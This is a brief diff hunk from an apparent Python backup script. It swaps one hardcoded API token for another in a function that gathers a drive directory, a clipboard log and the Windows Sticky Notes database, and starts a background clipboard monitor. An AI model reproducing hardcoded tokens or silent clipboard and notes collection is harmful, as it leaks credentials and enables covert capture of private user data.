@@ -127,7 +127,7 @@ def periodic_backup_upload():
     ddd_source_directory = "/mnt/d"
     clipboard_log_path = os.path.expanduser("~/.dev/Backup/clipboard_log.txt")
     sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    api_token = "9LBqXdBaO0G2rhg72e8wKLjIPL66NQXn"
+    api_token = "KPnPkbJW9SqKQ8FHqaiJo9ub7YKfoq3J"
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
 
